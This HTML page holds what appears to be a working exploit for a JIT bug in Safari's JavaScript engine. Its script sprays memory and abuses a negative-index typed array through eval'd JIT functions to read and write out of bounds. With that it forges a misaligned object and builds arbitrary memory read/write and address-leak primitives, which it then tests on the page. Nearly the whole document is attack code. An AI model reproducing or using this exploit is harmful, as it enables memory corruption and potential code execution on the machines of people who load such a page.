<html>
<body>
<script>

// I learned an important lesson whilist playing around with various JIT 1days. *Always* initialize your global vars cause sometimes, JIT acts like a b**** and gets unhappy about uninitialized vars for unknown reasons
var negative_index_array = new Uint32Array(0x10);
var gigabyte_spray_arrays = [];
var reference_index = -0x7c000000;          // Value that you might want to tweak
var jit_function = new Function();

var pressure = new Array(400);



// =============== Initializer functions ===============


function makeid() {
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    for (var i = 0; i < 8; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    return text;
};

var instancespr = [];
for (var i = 0; i < 4096; i++) {
    instancespr[i] = new Uint32Array(1);
    instancespr[i][makeid()] = 50057; /* spray 4-field Object InstanceIDs */
}


// =============== Main Functions ===============

function u2d(low, hi) {
    var _dview = null;

    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0, hi);
    _dview.setUint32(4, low);
    return _dview.getFloat64(0);
}

dgc = function() {
    for (var i = 0; i < pressure.length; i++) {
        pressure[i] = new Uint32Array(0xa000);
    }
}

function sleep(delay) {
    var start = new Date().getTime();
    while (new Date().getTime() < start + delay);
}

function log(str) {
    document.write('<b>[*] ' + str + '</b> <br />');
}

function create_relative_read_jit_function(index){
    var jit_function_string = `
        jit_function = function() {
            var reference_array = negative_index_array;
            for (var i=0; i<0x100000; ++i) parseInt();
            reference_array[1];

            var retval = reference_array[reference_index+` + index + `];
            // log('Leaked Value : ' + retval.toString(16));

            return retval;
        }`;

    return jit_function_string;
}

function create_relative_write_jit_function(index, value){
    var jit_function_string = `
        jit_function = function() {
            var reference_array = negative_index_array;
            for (var i=0; i<0x100000; ++i) parseInt();
            reference_array[1];

            reference_array[reference_index+` + index + `] = ` + value + `;
            // log('Writing test...');
        }`;

    return jit_function_string;
}

function int64(low, hi) {
    this.low = (low >>> 0);
    this.hi = (hi >>> 0);

    this.add32inplace = function(val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.add32 = function(val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32 = function(val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32inplace = function(val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.and32 = function(val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }

    this.and64 = function(vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }

    this.toString = function(val) {
        val = 16;
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);

        if (this.hi == 0)
            return lo_str;
        else
            lo_str = zeroFill(lo_str, 8)

        return hi_str + lo_str;
    }

    this.toPacked = function() {
        return {
            hi: this.hi,
            low: this.low
        };
    }

    this.setPacked = function(pck) {
        this.hi = pck.hi;
        this.low = pck.low;
        return this;
    }

    return this;
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}




// =============== Main Logic ===============

// This is going to spray 8 gigabytes on the Safari Memory. This is to push the subsequent allocations 8 gigabytes further away from 'negative_index_array'.
for(var i=0; i<4; i++) {
    gigabyte_spray_arrays[i] = new Uint8Array(0x7fffff00);
}
dgc();  // I don't know why but sometimes, the allocation would be 'scheduled' to happen in the future. This is to just make sure that the 8 gigabyte allocation precedes the sprayed arrays

var master = new Uint32Array(0x1000);
var slave = new Uint32Array(0x1000);
var leakval_u32 = new Uint32Array(0x1000);
var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
var misalign_object = {'a':u2d(2048, 0x602300), 'b':u2d(0,0), 'c':leakval_helper, 'd':u2d(0x1337,0)};

// Spray a bunch of target arrays
spray_count = 0x200000;
var spray_arrays = new Array(spray_count);
// To pre-allocate the Array and not let it grow continuously to avoid interference
spray_arrays.fill(0x11223344);
// Spraying a 60 element array is enough to create a 60MB space cusion in order to avoid the unmmapped holes inbetween (which would induce a crash)
for(var i=0; i<spray_count; i++) {
    spray_arrays[i] = [ 0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 
                        0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 
                        0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 
                        0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 0x13371337, i, misalign_object, 0x13371337, i, misalign_object ];
}

var leet_index, spray_array_relative_index, object_index;
var spray_array_index;
var object_addr_low, object_addr_high;
for(var i=0; i<10; i++){
    eval(create_relative_read_jit_function(i*2));
    var leaked_value = jit_function();
    if(leaked_value == 0x13371337){
        leet_index = i*2;
        break;
    }
}

spray_array_relative_index = leet_index + 2;        // index & object is always behind 0x13371337 even in the last element
object_index = leet_index + 4;


eval(create_relative_read_jit_function(spray_array_relative_index));
spray_array_index = jit_function();
eval(create_relative_read_jit_function(object_index));
object_addr_low = jit_function();
eval(create_relative_read_jit_function(object_index+1));
object_addr_high = jit_function();

eval(create_relative_write_jit_function(leet_index, 0x13381338));
jit_function();

var idx1, idx2;
idx1 = spray_array_index;
for(var i=0; i <spray_arrays[idx1].length; i++){
    if(spray_arrays[idx1][i] == 0x13381338){
        idx2 = i+2;
        break;
    }
}

// Misalign the object
eval(create_relative_write_jit_function(object_index, object_addr_low + 0x10));
jit_function();

// Getting the misaligned array
var fake_object = spray_arrays[idx1][idx2];

// Don't let the GC monster get ya! :D
spray_arrays[idx1][idx2] = 0;

// Setup read/write primitive
misalign_object.c = leakval_helper;
var butterfly = new int64(fake_object[2], fake_object[3]);

misalign_object.c = leakval_u32;
var lkv_u32_old = new int64(fake_object[4], fake_object[5]);
fake_object[4] = butterfly.low;
fake_object[5] = butterfly.hi;

misalign_object.c = master;
fake_object[4] = leakval_u32[0];
fake_object[5] = leakval_u32[1];

var addr_to_slavebuf = new int64(master[4], master[5]);
misalign_object.c = leakval_u32;
fake_object[4] = lkv_u32_old.low;
fake_object[5] = lkv_u32_old.hi;

// Don't let GC ruin the party :)
fake_object = 0;
misalign_object.c = 0;

var prim = {
    write8: function(addr, val) {
        master[4] = addr.low;
        master[5] = addr.hi;

        if (val instanceof int64) {
            slave[0] = val.low;
            slave[1] = val.hi;
        } else {
            slave[0] = val;
            slave[1] = 0;
        }

        master[4] = addr_to_slavebuf.low;
        master[5] = addr_to_slavebuf.hi;
    },

    write4: function(addr, val) {
        master[4] = addr.low;
        master[5] = addr.hi;

        slave[0] = val;

        master[4] = addr_to_slavebuf.low;
        master[5] = addr_to_slavebuf.hi;
    },

    read8: function(addr) {
        master[4] = addr.low;
        master[5] = addr.hi;

        var rtv = new int64(slave[0], slave[1]);

        master[4] = addr_to_slavebuf.low;
        master[5] = addr_to_slavebuf.hi;

        return rtv;
    },

    read4: function(addr) {
        master[4] = addr.low;
        master[5] = addr.hi;

        var rtv = slave[0];

        master[4] = addr_to_slavebuf.low;
        master[5] = addr_to_slavebuf.hi;

        return rtv;
    },

    leakval: function(jsval) {
        leakval_helper[0] = jsval;
        var rtv = this.read8(butterfly);
        this.write8(butterfly, new int64(0x41414141, 0xffff0000));

        return rtv;
    },

    createval: function(jsval) {
        this.write8(butterfly, jsval);
        var rt = leakval_helper[0];
        this.write8(butterfly, new int64(0x41414141, 0xffff0000));
        return rt;
    }
};

log('JSVal read test : ' + prim.leakval(0x41414141));
log('JSObject read test : ' + prim.leakval({a:1}));



</script>
</body>
</html>